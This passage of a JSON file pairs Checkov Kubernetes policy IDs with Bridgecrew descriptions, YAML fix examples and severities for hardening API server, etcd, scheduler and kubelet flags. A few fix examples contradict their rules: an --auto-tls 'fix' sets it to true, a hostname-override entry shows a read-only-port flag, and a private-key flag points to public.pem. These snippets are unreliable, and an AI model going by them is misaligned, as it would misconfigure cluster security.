        "description": "The admission control plugin NamespaceLifecycle is not set  \nDescription\nReject creating objects in a namespace that is undergoing termination.\nSetting admission control policy to NamespaceLifecycle ensures that objects cannot be created in non-existent namespaces, and that namespaces undergoing termination are not used for creating the new objects. This is recommended to enforce the integrity of the namespace termination process and also for the availability of the newer objects.\nFix - Buildtime \nKubernetes\n\nKind: Pod\n\nYAMLapiVersion: v1\nkind: Pod\nmetadata:\n  creationTimestamp: null\n  labels:\n    component: kube-apiserver\n    tier: control-plane\n  name: kube-apiserver\n  namespace: kube-system\nspec:\n  containers:\n  - command:\n+   - kube-apiserver\n+   - --enable-admission-plugins=NamespaceLifecycle\n    image: gcr.io/google_containers/kube-apiserver-amd64:v1.6.0\n    ...\n",
        "severity": "LOW"
    },
    "CKV_K8S_84": {
        "url": "https://docs.bridgecrew.io/docs/ensure-that-the-admission-control-plugin-podsecuritypolicy-is-set",
        "description": "The admission control plugin PodSecurityPolicy is not set\nDescription\nReject creating pods that do not match Pod Security Policies.\nA Pod Security Policy is a cluster-level resource that controls the actions that a pod can perform and what it has the ability to access. The PodSecurityPolicy objects define a set of conditions that a pod must run with in order to be accepted into the system. Pod Security Policies are comprised of settings and strategies that control the security features a pod has access to and hence this must be used to control pod access permissions.\n\ud83d\udcd8NoteWhen the PodSecurityPolicy admission plugin is in use, there needs to be at least one PodSecurityPolicy in place for ANY pods to be admitted. See section 5.2 for recommendations on PodSecurityPolicy settings.\nFix - Buildtime \nKubernetes\n\nKind: Pod\n\nYAMLapiVersion: v1\nkind: Pod\nmetadata:\n  creationTimestamp: null\n  labels:\n    component: kube-apiserver\n    tier: control-plane\n  name: kube-apiserver\n  namespace: kube-system\nspec:\n  containers:\n  - command:\n+   - kube-apiserver\n+   - --enable-admission-plugins=PodSecurityPolicy\n    image: gcr.io/google_containers/kube-apiserver-amd64:v1.6.0\n    ...\n",
        "severity": "LOW"
    },
    "CKV_K8S_91": {
        "url": "https://docs.bridgecrew.io/docs/ensure-that-the-audit-log-path-argument-is-set",
        "description": "The --audit-log-path argument is not set\nDescription\nEnable auditing on the Kubernetes API Server and set the desired audit log path.\nAuditing the Kubernetes API Server provides a security-relevant chronological set of records documenting the sequence of activities that have affected system by individual users, administrators or other components of the system. Even though currently, Kubernetes provides only basic audit capabilities, it should be enabled. You can enable it by setting an appropriate audit log path.\nFix - Buildtime \nKubernetes\n\nKind: Pod\n\nYAMLapiVersion: v1\nkind: Pod\nmetadata:\n  creationTimestamp: null\n  labels:\n    component: kube-apiserver\n    tier: control-plane\n  name: kube-apiserver\n  namespace: kube-system\nspec:\n  containers:\n  - command:\n +  - kube-apiserver\n +  - --audit-log-path=/path/to/log\n    image: gcr.io/google_containers/kube-apiserver-amd64:v1.6.0\n    ...\n",
        "severity": "MEDIUM"
    },
    "CKV_K8S_118": {
        "url": "https://docs.bridgecrew.io/docs/ensure-that-the-auto-tls-argument-is-not-set-to-true",
        "description": "The --auto-tls argument is set to True\nDescription\nDo not use self-signed certificates for TLS. etcd is a highly-available key value store used by Kubernetes deployments for persistent storage of all of its REST API objects. These objects are sensitive in nature and should not be available to unauthenticated clients. You should enable the client authentication via valid certificates to secure the access to the etcd service.\nFix - Buildtime \nKubernetes\n\nKind: Pod\n\nYAMLapiVersion: v1\nkind: Pod\nmetadata:\n  annotations:\n    scheduler.alpha.kubernetes.io/critical-pod: \"\"\n  creationTimestamp: null\n  labels:\n    component: etcd\n    tier: control-plane\n  name: etcd\n  namespace: kube-system\nspec:\n  containers:\n  - command:\n+   - etcd\n+   - --auto-tls=true\n    image: k8s.gcr.io/etcd-amd64:3.2.18\n",
        "severity": "HIGH"
    },
    "CKV_K8S_92": {
        "url": "https://docs.bridgecrew.io/docs/ensure-that-the-audit-log-maxage-argument-is-set-to-30-or-as-appropriate",
        "description": "The --audit-log-maxage argument is not set appropriately\nDescription\nRetain the logs for at least 30 days or as appropriate. Retaining logs for at least 30 days ensures that you can go back in time and investigate or correlate any events. Set your audit log retention period to 30 days or as per your business requirements.\nFix - Buildtime \nKubernetes\n\nKind: Pod\n\nYAMLapiVersion: v1\nkind: Pod\nmetadata:\n  creationTimestamp: null\n  labels:\n    component: kube-apiserver\n    tier: control-plane\n  name: kube-apiserver\n  namespace: kube-system\nspec:\n  containers:\n  - command:\n+    - kube-apiserver\n+    - --audit-log-maxage=40\n    image: gcr.io/google_containers/kube-apiserver-amd64:v1.6.0\n    ...\n",
        "severity": "LOW"
    },
    "CKV_K8S_93": {
        "url": "https://docs.bridgecrew.io/docs/ensure-that-the-audit-log-maxbackup-argument-is-set-to-10-or-as-appropriate",
        "description": "The --audit-log-maxbackup argument is not set appropriately\nDescription\nRetain 10 or an appropriate number of old log files. Kubernetes automatically rotates the log files. Retaining old log files ensures that you would have sufficient log data available for carrying out any investigation or correlation. For example, if you have set file size of 100 MB and the number of old log files to keep as 10, you would approximate have 1 GB of log data that you could potentially use for your analysis.\nFix - Buildtime \nKubernetes\n\nKind: Pod\n\nYAMLapiVersion: v1\nkind: Pod\nmetadata:\n  creationTimestamp: null\n  labels:\n    component: kube-apiserver\n    tier: control-plane\n  name: kube-apiserver\n  namespace: kube-system\nspec:\n  containers:\n  - command:\n+   - kube-apiserver\n+   - --audit-log-maxbackup=15\n    image: gcr.io/google_containers/kube-apiserver-amd64:v1.6.0\n    ...\n",
        "severity": "LOW"
    },
    "CKV_K8S_94": {
        "url": "https://docs.bridgecrew.io/docs/ensure-that-the-audit-log-maxsize-argument-is-set-to-100-or-as-appropriate",
        "description": "The --audit-log-maxsize argument is not set appropriately\nDescription\nRotate log files on reaching 100 MB or as appropriate. Kubernetes automatically rotates the log files. Retaining old log files ensures that you would have sufficient log data available for carrying out any investigation or correlation. If you have set file size of 100 MB and the number of old log files to keep as 10, you would approximate have 1 GB of log data that you could potentially use for your analysis.\nFix - Buildtime \nKubernetes\n\nKind: Pod\n\nYAMLapiVersion: v1\nkind: Pod\nmetadata:\n  creationTimestamp: null\n  labels:\n    component: kube-apiserver\n    tier: control-plane\n  name: kube-apiserver\n  namespace: kube-system\nspec:\n  containers:\n  - command:\n+   - kube-apiserver\n+   - --audit-log-maxsize=150\n    image: gcr.io/google_containers/kube-apiserver-amd64:v1.6.0\n    ...\n",
        "severity": "LOW"
    },
    "CKV_K8S_95": {
        "url": "https://docs.bridgecrew.io/docs/ensure-that-the-request-timeout-argument-is-set-as-appropriate",
        "description": "The --request-timeout argument is not set appropriately\nDescription\nSet global request timeout for API server requests as appropriate. Setting global request timeout allows extending the API server request timeout limit to a duration appropriate to the user's connection speed. By default, it is set to 60 seconds which might be problematic on slower connections making cluster resources inaccessible once the data volume for requests exceeds what can be transmitted in 60 seconds. But, setting this timeout limit to be too large can exhaust the API server resources making it prone to Denial-of-Service attack. Hence, it is recommended to set this limit as appropriate and change the default limit of 60 seconds only if needed.\nFix - Buildtime \nKubernetes\n\nKind: Pod\n\nYAMLapiVersion: v1\nkind: Pod\nmetadata:\n  creationTimestamp: null\n  labels:\n    component: kube-apiserver\n    tier: control-plane\n  name: kube-apiserver\n  namespace: kube-system\nspec:\n  containers:\n  - command:\n+   - kube-apiserver\n+   - --request-timeout=2m3s\n    image: gcr.io/google_containers/kube-apiserver-amd64:v1.6.0\n    ...\n",
        "severity": "MEDIUM"
    },
    "CKV_K8S_99": {
        "url": "https://docs.bridgecrew.io/docs/ensure-that-the-etcd-certfile-and-etcd-keyfile-arguments-are-set-as-appropriate",
        "description": "The --etcd-certfile and --etcd-keyfile arguments are not set appropriately\nDescription\netcd should be configured to make use of TLS encryption for client connections.\netcd is a highly-available key value store used by Kubernetes deployments for persistent storage of all of its REST API objects. These objects are sensitive in nature and should be protected by client authentication. This requires the API server to identify itself to the etcd server using a client certificate and key.\nFix - Buildtime \nKubernetes\n\nKind: Pod\n\nYAMLapiVersion: v1\nkind: Pod\nmetadata:\n  creationTimestamp: null\n  labels:\n    component: kube-apiserver\n    tier: control-plane\n  name: kube-apiserver\n  namespace: kube-system\nspec:\n  containers:\n  - command:\n    - kube-apiserver\n    - --etcd-certfile=/path/to/cert\n    - --etcd-keyfile=/path/to/key\n    image: gcr.io/google_containers/kube-apiserver-amd64:v1.6.0\n    livenessProbe:\n      failureThreshold: 8\n      httpGet:\n        host: 127.0.0.1\n        path: /healthz\n        port: 6443\n        scheme: HTTPS\n      initialDelaySeconds: 15\n      timeoutSeconds: 15\n    name: kube-apiserver-should-pass\n    resources:\n      requests:\n        cpu: 250m\n    volumeMounts:\n    - mountPath: /etc/kubernetes/\n      name: k8s\n      readOnly: true\n    - mountPath: /etc/ssl/certs\n      name: certs\n    - mountPath: /etc/pki\n      name: pki\n  hostNetwork: true\n  volumes:\n  - hostPath:\n      path: /etc/kubernetes\n    name: k8s\n  - hostPath:\n      path: /etc/ssl/certs\n    name: certs\n  - hostPath:\n      path: /etc/pki\n    name: pki\n",
        "severity": "HIGH"
    },
    "CKV_K8S_100": {
        "url": "https://docs.bridgecrew.io/docs/ensure-that-the-tls-cert-file-and-tls-private-key-file-arguments-are-set-as-appropriate",
        "description": "The --tls-cert-file and --tls-private-key-file arguments are not set appropriately for API servers\nDescription\n API server communication contains sensitive parameters that should remain encrypted in transit. Configure the API server to serve only HTTPS traffic by setup TLS connection on the API server. By default, --tls-cert-file and --tls-private-key-file arguments are not set.\nFix - Buildtime \nKubernetes\n\nKind: Pod\n\nYAMLapiVersion: v1\n  kind: Pod\n  metadata:\n    creationTimestamp: null\n    labels:\n      component: kube-apiserver\n      tier: control-plane\n    name: kube-apiserver\n    namespace: kube-system\n  spec:\n    containers:\n    - command:\n       - kube-apiserver\n+      - --tls-cert-file=/path/to/cert\n+      - --tls-private-key-file=/path/to/key\n      image: gcr.io/google_containers/kube-apiserver-amd64:v1.6.0\n      livenessProbe:\n        failureThreshold: 8\n        httpGet:\n          host: 127.0.0.1\n          path: /healthz\n          port: 6443\n          scheme: HTTPS\n        initialDelaySeconds: 15\n        timeoutSeconds: 15\n      name: kube-apiserver\n      resources:\n        requests:\n          cpu: 250m\n      volumeMounts:\n      - mountPath: /etc/kubernetes/\n        name: k8s\n        readOnly: true\n      - mountPath: /etc/ssl/certs\n        name: certs\n      - mountPath: /etc/pki\n        name: pki\n    hostNetwork: true\n    volumes:\n    - hostPath:\n        path: /etc/kubernetes\n      name: k8s\n    - hostPath:\n        path: /etc/ssl/certs\n      name: certs\n    - hostPath:\n        path: /etc/pki\n      name: pki\n",
        "severity": "HIGH"
    },
    "CKV_K8S_102": {
        "url": "https://docs.bridgecrew.io/docs/ensure-that-the-etcd-cafile-argument-is-set-as-appropriate-1",
        "description": "The --etcd-cafile argument is not set appropriately\nDescription\netcd should be configured to make use of TLS encryption for client connections. etcd is a highly-available key value store used by Kubernetes deployments for persistent storage of all of its REST API objects. These objects are sensitive in nature and should be protected by client authentication. This requires the API server to identify itself to the etcd server using a SSL Certificate Authority file.\nFix - Buildtime \nKubernetes\n\nKind: Pod\n\nYAMLapiVersion: v1\nkind: Pod\nmetadata:\n  creationTimestamp: null\n  labels:\n    component: kube-apiserver\n    tier: control-plane\n  name: kube-apiserver\n  namespace: kube-system\nspec:\n  containers:\n  - command:\n+   - kube-apiserver\n+   - --etcd-ca-file=ca.file\n    image: gcr.io/google_containers/kube-apiserver-amd64:v1.6.0\n    livenessProbe:\n      failureThreshold: 8\n      httpGet:\n        host: 127.0.0.1\n        path: /healthz\n        port: 6443\n        scheme: HTTPS\n      initialDelaySeconds: 15\n      timeoutSeconds: 15\n    name: kube-apiserver\n    resources:\n      requests:\n        cpu: 250m\n    volumeMounts:\n    - mountPath: /etc/kubernetes/\n      name: k8s\n      readOnly: true\n    - mountPath: /etc/ssl/certs\n      name: certs\n    - mountPath: /etc/pki\n      name: pki\n  hostNetwork: true\n  volumes:\n  - hostPath:\n      path: /etc/kubernetes\n    name: k8s\n  - hostPath:\n      path: /etc/ssl/certs\n    name: certs\n  - hostPath:\n      path: /etc/pki\n    name: pki\n",
        "severity": "HIGH"
    },
    "CKV_K8S_104": {
        "url": "https://docs.bridgecrew.io/docs/ensure-that-the-etcd-cafile-argument-is-set-as-appropriate",
        "description": "Encryption providers are not appropriately configured\nDescription\nWhere etcd encryption is used, appropriate providers should be configured. Where etcd encryption is used, it is important to ensure that the appropriate set of encryption providers is used. Currently, the aescbc, kms and secretbox are likely to be appropriate options.\nFix - Buildtime \nKubernetes\n\nKind: Pod\n\nGoapiVersion: v1\nkind: Pod\nmetadata:\n  creationTimestamp: null\n  labels:\n    component: kube-apiserver\n    tier: control-plane\n  name: kube-apiserver\n  namespace: kube-system\nspec:\n  containers:\n  - command:\n+   - kube-apiserver\n+   - --encryption-provider-config=config.file\n    image: gcr.io/google_containers/kube-apiserver-amd64:v1.6.0\n    livenessProbe:\n      failureThreshold: 8\n      httpGet:\n        host: 127.0.0.1\n        path: /healthz\n        port: 6443\n        scheme: HTTPS\n      initialDelaySeconds: 15\n      timeoutSeconds: 15\n    name: kube-apiserver-should-pass\n    resources:\n      requests:\n        cpu: 250m\n    volumeMounts:\n    - mountPath: /etc/kubernetes/\n      name: k8s\n      readOnly: true\n    - mountPath: /etc/ssl/certs\n      name: certs\n    - mountPath: /etc/pki\n      name: pki\n  hostNetwork: true\n  volumes:\n  - hostPath:\n      path: /etc/kubernetes\n    name: k8s\n  - hostPath:\n      path: /etc/ssl/certs\n    name: certs\n  - hostPath:\n      path: /etc/pki\n    name: pki\n",
        "severity": "CRITICAL"
    },
    "CKV_K8S_106": {
        "url": "https://docs.bridgecrew.io/docs/ensure-that-the-terminated-pod-gc-threshold-argument-is-set-as-appropriate",
        "description": "The --terminated-pod-gc-threshold argument for controller managers is not set appropriately\nDescription\nActivate garbage collector on pod termination, as appropriate.. Garbage collection is important to ensure sufficient resource availability and avoiding degraded performance and availability. In the worst case, the system might crash or just be unusable for a long period of time. The current setting for garbage collection is 12,500 terminated pods which might be too high for your system to sustain. Based on your system resources and tests, choose an appropriate threshold value to activate garbage collection.\nFix - Buildtime \nKubernetes\n\nKind: Pod\n\nYAMLapiVersion: v1\n  kind: Pod\n  metadata:\n    creationTimestamp: null\n    labels:\n      component: kube-controller-manager\n      tier: control-plane\n    name: kube-controller-manager\n    namespace: kube-system\n  spec:\n    containers:\n    - command:\n      - kube-controller-manager\n+     -  --terminated-pod-gc-threshold=555\n      image: gcr.io/google_containers/kube-controller-manager-amd64:v1.6.0\n      livenessProbe:\n        failureThreshold: 8\n        httpGet:\n          host: 127.0.0.1\n          path: /healthz\n          port: 6443\n          scheme: HTTPS\n        initialDelaySeconds: 15\n        timeoutSeconds: 15\n      name: kube-controller-manager-should-pass\n      resources:\n        requests:\n          cpu: 250m\n      volumeMounts:\n      - mountPath: /etc/kubernetes/\n        name: k8s\n        readOnly: true\n      - mountPath: /etc/ssl/certs\n        name: certs\n      - mountPath: /etc/pki\n        name: pki\n    hostNetwork: true\n    volumes:\n    - hostPath:\n        path: /etc/kubernetes\n      name: k8s\n    - hostPath:\n        path: /etc/ssl/certs\n      name: certs\n    - hostPath:\n        path: /etc/pki\n      name: pki\n",
        "severity": "MEDIUM"
    },
    "CKV_K8S_107": {
        "url": "https://docs.bridgecrew.io/docs/ensure-that-the-profiling-argument-is-set-to-false",
        "description": "The --profiling argument for controller managers is not set to False\nDescription\nDisable profiling, if not needed. Profiling allows for the identification of specific performance bottlenecks. It generates a significant amount of program data that could potentially be exploited to uncover system and program details. If you are not experiencing any bottlenecks and do not need the profiler for troubleshooting purposes, it is recommended to turn it off to reduce the potential attack surface.\nFix - Buildtime \nKubernetes\n\nKind: Pod\n\nYAMLapiVersion: v1\n  kind: Pod\n  metadata:\n    creationTimestamp: null\n    labels:\n      component: kube-controller-manager\n      tier: control-plane\n    name: kube-controller-manager\n    namespace: kube-system\n  spec:\n    containers:\n    - command:\n      - kube-controller-manager\n+     -  --profiling=false\n      image: gcr.io/google_containers/kube-controller-manager-amd64:v1.6.0\n",
        "severity": "MEDIUM"
    },
    "CKV_K8S_110": {
        "url": "https://docs.bridgecrew.io/docs/ensure-that-the-service-account-private-key-file-argument-is-set-as-appropriate",
        "description": "The --service-account-private-key-file argument for controller managers is not set appropriately\nDescription\nExplicitly set a service account private key file for service accounts on the controller manager. To ensure that keys for service account tokens can be rotated as needed, a separate public/private key pair should be used for signing service account tokens. The private key should be specified to the controller manager with --service-account-private-key-file as appropriate.\nFix - Buildtime \nKubernetes\n\nKind: Pod\n\nYAMLapiVersion: v1\n  kind: Pod\n  metadata:\n    creationTimestamp: null\n    labels:\n      component: kube-controller-manager\n      tier: control-plane\n    name: kube-controller-manager\n    namespace: kube-system\n  spec:\n    containers:\n    - command:\n      - kube-controller-manager\n+     -  --service-account-private-key-file=public.pem\n      image: gcr.io/google_containers/kube-controller-manager-amd64:v1.6.0\n",
        "severity": "HIGH"
    },
    "CKV_K8S_113": {
        "url": "https://docs.bridgecrew.io/docs/ensure-that-the-bind-address-argument-is-set-to-127001",
        "description": "The --bind-address argument for controller managers is not set to 127.0.0.1\nDescription\nDo not bind the Controller Manager service to non-loopback insecure addresses. The Controller Manager API service which runs on port 10252/TCP by default is used for health and metrics information and is available without authentication or encryption. As such it should only be bound to a localhost interface, to minimize the cluster's attack surface\nFix - Buildtime \nKubernetes\n\nKind: Pod\n\nYAMLapiVersion: v1\n  kind: Pod\n  metadata:\n    creationTimestamp: null\n    labels:\n      component: kube-apiserver\n      tier: control-plane\n    name: kube-apiserver\n    namespace: kube-system\n  spec:\n    containers:\n    - command:\n      - kube-controller-manager\n+     - --bind-address=127.0.0.1\n      image: gcr.io/google_containers/kube-apiserver-amd64:v1.6.0\n",
        "severity": "HIGH"
    },
    "CKV_K8S_114": {
        "url": "https://docs.bridgecrew.io/docs/ensure-that-the-profiling-argument-is-set-to-false-1",
        "description": "The --profiling argument is not set to False\nDescription\nDisable profiling, if not needed.\nProfiling allows for the identification of specific performance bottlenecks. It generates a significant amount of program data that could potentially be exploited to uncover system and program details. If you are not experiencing any bottlenecks and do not need the profiler for troubleshooting purposes, it is recommended to turn it off to reduce the potential attack surface.\nFix - Buildtime \nKubernetes\n\nKind: Pod\n\nYAMLapiVersion: v1\nkind: Pod\nmetadata:\n  creationTimestamp: null\n  labels:\n    component: kube-scheduler\n    tier: control-plane\n  name: kube-scheduler\n  namespace: kube-system\nspec:\n  containers:\n  - command:\n+   - kube-scheduler\n+   - --profiling=false\n    image: gcr.io/google_containers/kube-scheduler-amd64:v1.6.0\n",
        "severity": "LOW"
    },
    "CKV_K8S_115": {
        "url": "https://docs.bridgecrew.io/docs/ensure-that-the-bind-address-argument-is-set-to-127001-1",
        "description": "The --bind-address argument is not set to 127.0.0.1\nDescription\nDo not bind the scheduler service to non-loopback insecure addresses. The Scheduler API service which runs on port 10251/TCP by default is used for health and metrics information and is available without authentication or encryption. As such it should only be bound to a localhost interface, to minimize the cluster's attack surface.\nFix - Buildtime \nKubernetes\n\nKind: Pod\n\nYAMLpiVersion: v1\nkind: Pod\nmetadata:\n  creationTimestamp: null\n  labels:\n    component: kube-apiserver\n    tier: control-plane\n  name: kube-apiserver\n  namespace: kube-system\nspec:\n  containers:\n  - command:\n+    - kube-scheduler\n+    - --bind-address=127.0.0.1\n    image: gcr.io/google_containers/kube-apiserver-amd64:v1.6.0\n",
        "severity": "HIGH"
    },
    "CKV_K8S_116": {
        "url": "https://docs.bridgecrew.io/docs/ensure-that-the-cert-file-and-key-file-arguments-are-set-as-appropriate",
        "description": "The --cert-file and --key-file arguments are not set appropriately\nDescription\nConfigure TLS encryption for the etcd service. etcd is a highly-available key value store used by Kubernetes deployments for persistent storage of all of its REST API objects. These objects are sensitive in nature and should be encrypted in transit.\nFix - Buildtime \nKubernetes\n\nKind: Pod\n\nYAMLapiVersion: v1\nkind: Pod\nmetadata:\n  creationTimestamp: null\n  labels:\n    component: kube-apiserver\n    tier: control-plane\n  name: kube-apiserver\n  namespace: kube-system\nspec:\n  containers:\n  - command:\n+   - kube-apiserver\n+   - --etcd-certfile=/path/to/cert\n+   - --etcd-keyfile=/path/to/key\n    image: gcr.io/google_containers/kube-apiserver-amd64:v1.6.0\n",
        "severity": "HIGH"
    },
    "CKV_K8S_119": {
        "url": "https://docs.bridgecrew.io/docs/ensure-that-the-peer-cert-file-and-peer-key-file-arguments-are-set-as-appropriate",
        "description": "The --peer-cert-file and --peer-key-file arguments are not set appropriately\nDescription\netcd should be configured to make use of TLS encryption for peer connections. etcd is a highly-available key value store used by Kubernetes deployments for persistent storage of all of its REST API objects. These objects are sensitive in nature and should be encrypted in transit and also amongst peers in the etcd clusters.\nFix - Buildtime \nKubernetes\n\nKind: Pod\n\nYAMLapiVersion: v1\nkind: Pod\nmetadata:\n  creationTimestamp: null\n  labels:\n    component: kube-apiserver\n    tier: control-plane\n  name: kube-apiserver\n  namespace: kube-system\nspec:\n  containers:\n  - command:\n+   - etcd\n+   - --peer-cert-file=file.pem\n+   - --peer-key-file=file.key\n    image: gcr.io/google_containers/kube-apiserver-amd64:v1.6.0\n",
        "severity": "HIGH"
    },
    "CKV_K8S_121": {
        "url": "https://docs.bridgecrew.io/docs/ensure-that-the-peer-client-cert-auth-argument-is-set-to-true",
        "description": "The --peer-client-cert-auth argument is not set to True\nDescription\netcd should be configured for peer authentication. etcd is a highly-available key value store used by Kubernetes deployments for persistent storage of all of its REST API objects. These objects are sensitive in nature and should be accessible only by authenticated etcd peers in the etcd cluster.\nFix - Buildtime \nKubernetes\n\nKind: Pod\n\nGoapiVersion: v1\nkind: Pod\nmetadata:\n  name: etcd\n  namespace: should-pass\nspec:\n  hostNetwork: true\n  containers:\n      - name: \"kuku2\"\n        image: \"b.gcr.io/kuar/etcd:2.2.0\"\n        args:\n          ...\n+         - \"--peer-client-cert-auth=true\"\n        ...\n",
        "severity": "HIGH"
    },
    "CKV_K8S_141": {
        "url": "https://docs.bridgecrew.io/docs/ensure-that-the-read-only-port-argument-is-set-to-0",
        "description": "The --read-only-port argument is not set to 0\nDescription\nDisable the read-only port. The Kubelet process provides a read-only API in addition to the main Kubelet API. Unauthenticated access is provided to this read-only API which could possibly retrieve potentially sensitive information about the cluster.\nFix - Buildtime \nKubernetes\n\nKind: Pod\n\nYAMLapiVersion: v1\nkind: Pod\nmetadata:\n  creationTimestamp: null\n  labels:\n    component: kubelet\n    tier: control-plane\n  name: kubelet\n  namespace: kube-system\nspec:\n  containers:\n  - command:\n+   - kubelet\n+   - --read-only-port=0\n    image: gcr.io/google_containers/kubelet-amd64:v1.6.0\n    ...\n",
        "severity": "LOW"
    },
    "CKV_K8S_143": {
        "url": "https://docs.bridgecrew.io/docs/ensure-that-the-streaming-connection-idle-timeout-argument-is-not-set-to-0",
        "description": "The --streaming-connection-idle-timeout argument is set to 0  \nDescription\nDo not disable timeouts on streaming connections.\nSetting idle timeouts ensures that you are protected against Denial-of-Service attacks, inactive connections and running out of ephemeral ports.\nBy default, --streaming-connection-idle-timeout is set to 4 hours which might be too high for your environment. Setting this as appropriate would addition\nally ensure that such streaming connections are timed out after serving legitimate use cases.\nFix - Buildtime \nKubernetes\n\nKind: Pod\n\nYAMLapiVersion: v1\nkind: Pod\nmetadata:\n  creationTimestamp: null\n  labels:\n    component: kubelet\n    tier: control-plane\n  name: kubelet\n  namespace: kube-system\nspec:\n  containers:\n  - command:\n+   - kubelet\n+   - --streaming-connection-idle-timeout=1\n    image: gcr.io/google_containers/kubelet-amd64:v1.6.0\n    ...\n",
        "severity": "LOW"
    },
    "CKV_K8S_144": {
        "url": "https://docs.bridgecrew.io/docs/ensure-that-the-protect-kernel-defaults-argument-is-set-to-true",
        "description": "The --protect-kernel-defaults argument is not set to True \nDescription\nProtect tuned kernel parameters from overriding kubelet default kernel parameter values.\nKernel parameters are usually tuned and hardened by the system administrators before putting the systems into production. These parameters protect the kernel and the system. Your kubelet kernel defaults that rely on such parameters should be appropriately set to match the desired secured system state. Ignoring this could potentially lead to running pods with undesired kernel behavior.\nFix - Buildtime \nKubernetes\n\nKind: Pod\n\nYAMLapiVersion: v1\nkind: Pod\nmetadata:\n  creationTimestamp: null\n  labels:\n    component: kubelet\n    tier: control-plane\n  name: kubelet\n  namespace: kube-system\nspec:\n  containers:\n  - command:\n+   - kubelet\n+   - --protect-kernel-defaults=true\n    image: gcr.io/google_containers/kubelet-amd64:v1.6.0\n    ...\n",
        "severity": "LOW"
    },
    "CKV_K8S_145": {
        "url": "https://docs.bridgecrew.io/docs/ensure-that-the-make-iptables-util-chains-argument-is-set-to-true",
        "description": "The --make-iptables-util-chains argument is not set to True\nDescription\nAllow Kubelet to manage iptables. Kubelets can automatically manage the required changes to iptables based on how you choose your networking options for the pods. It is recommended to let kubelets manage the changes to iptables. This ensures that the iptables configuration remains in sync with pods networking configuration. Manually configuring iptables with dynamic pod network configuration changes might hamper the communication between pods/containers and to the outside world. You might have iptables rules too restrictive or too open.\nFix - Buildtime \nKubernetes\n\nResource: Pod\n\nYAMLapiVersion: v1\nkind: Pod\nmetadata:\n  creationTimestamp: null\n  labels:\n    component: kubelet\n    tier: control-plane\n  name: kubelet\n  namespace: kube-system\nspec:\n  containers:\n  - command:\n+   - kubelet\n+   - --make-iptables-util-chains=true\n    image: gcr.io/google_containers/kubelet-amd64:v1.6.0\n    ...\n",
        "severity": "LOW"
    },
    "CKV_K8S_146": {
        "url": "https://docs.bridgecrew.io/docs/ensure-that-the-hostname-override-argument-is-not-set",
        "description": "The --hostname-override argument is set\nDescription\nDo not override node hostnames. Overriding hostnames could potentially break TLS setup between the kubelet and the apiserver. Additionally, with overridden hostnames, it becomes increasingly difficult to associate logs with a particular node and process them for security analytics. Hence, you should setup your kubelet nodes with resolvable FQDNs and avoid overriding the hostnames with IPs.\nFix - Buildtime \nKubernetes\n\nKind: Pod\n\nYAMLapiVersion: v1\nkind: Pod\nmetadata:\n  creationTimestamp: null\n  labels:\n    component: kubelet\n    tier: control-plane\n  name: kubelet\n  namespace: kube-system\nspec:\n  containers:\n  - command:\n    - kubelet\n    - --read-only-port=80\n    image: gcr.io/google_containers/kubelet-amd64:v1.6.0\n    livenessProbe:\n      failureThreshold: 8\n      httpGet:\n        host: 127.0.0.1\n        path: /healthz\n        port: 6443\n        scheme: HTTPS\n      initialDelaySeconds: 15\n      timeoutSeconds: 15\n    name: kubelet\n    resources:\n      requests:\n        cpu: 250m\n    volumeMounts:\n    - mountPath: /etc/kubernetes/\n      name: k8s\n      readOnly: true\n    - mountPath: /etc/ssl/certs\n      name: certs\n    - mountPath: /etc/pki\n      name: pki\n  hostNetwork: true\n  volumes:\n  - hostPath:\n      path: /etc/kubernetes\n    name: k8s\n  - hostPath:\n      path: /etc/ssl/certs\n    name: certs\n  - hostPath:\n      path: /etc/pki\n    name: pki\n",
        "severity": "LOW"
    },
    "CKV_K8S_147": {
        "url": "https://docs.bridgecrew.io/docs/ensure-that-the-event-qps-argument-is-set-to-0-or-a-level-which-ensures-appropriate-event-capture",
        "description": "The --event-qps argument is not set to a level that ensures appropriate event capture\nDescription\nSecurity relevant information should be captured. The --event-qps flag on the Kubelet can be used to limit the rate at which events are gathered. Setting this too low could result in relevant events not being logged, however the unlimited setting of 0 could result in a denial of service on the kubelet.\nIt is important to capture all events and not restrict event creation. Events are an important source of security information and analytics that ensure that your environment is consistently monitored using the event data.\nFix - Buildtime \nKubernetes\nKind  Pod\nYAMLapiVersion: v1\nkind: Pod\nmetadata:\n  creationTimestamp: null\n  labels:\n    component: kubelet\n    tier: control-plane\n  name: kubelet\n  namespace: kube-system\nspec:\n  containers:\n  - command:\n+   - kubelet\n+   - --event-qps=2\n    image: gcr.io/google_containers/kubelet-amd64:v1.6.0\n    ...\n",
        "severity": "LOW"
    },
    "CKV_K8S_148": {
        "url": "https://docs.bridgecrew.io/docs/ensure-that-the-tls-cert-file-and-tls-private-key-file-arguments-are-set-as-appropriate-for-kubelet",
        "description": "The --tls-cert-file and --tls-private-key-file arguments are not set appropriately for Kubelety\nDescription\n API server communication contains sensitive parameters that should remain encrypted in transit. Configure the API server to serve only HTTPS traffic by setup TLS connection on the API server. By default, --tls-cert-file and --tls-private-key-file arguments are not set.\nFix - Buildtime \nKubernetes\n\nKind: Pod\n\nYAMLapiVersion: v1\n  kind: Pod\n  metadata:\n    creationTimestamp: null\n    labels:\n      component: kube-apiserver\n      tier: control-plane\n    name: kube-apiserver\n    namespace: kube-system\n  spec:\n    containers:\n    - command:\n       - kube-apiserver\n+      - --tls-cert-file=/path/to/cert\n+      - --tls-private-key-file=/path/to/key\n      image: gcr.io/google_containers/kube-apiserver-amd64:v1.6.0\n      ...\n",
        "severity": "HIGH"
    },
    "CKV_K8S_149": {
        "url": "https://docs.bridgecrew.io/docs/ensure-that-the-rotate-certificates-argument-is-not-set-to-false",
        "description": "The --rotate-certificates argument is set to False\nDescription\nEnable kubelet client certificate rotation.\nThe --rotate-certificates setting causes the kubelet to rotate its client certificates by creating new CSRs as its existing credentials expire. This automated periodic rotation ensures that the there is no downtime due to expired certificates and thus addressing availability in the CIA security triad.\n\ud83d\udcd8NoteThis recommendation only applies if you let kubelets get their certificates from the API server. In case your kubelet certificates come from an outside authority/tool (e.g. Vault) then you need to take care of rotation yourself.\nFix - Buildtime \nKubernetes\nKind Pod\nYAMLapiVersion: v1\nkind: Pod\nmetadata:\n  creationTimestamp: null\n  labels:\n    component: kube-scheduler\n    tier: control-plane\n  name: kube-scheduler\n  namespace: kube-system\nspec:\n  containers:\n  - command:\n +  - kubelet\n +  - --rotate-certificates=true\n    image: gcr.io/google_containers/kube-scheduler-amd64:v1.6.0\n    ...\n",
        "severity": "HIGH"
    },
    "CKV_K8S_151": {
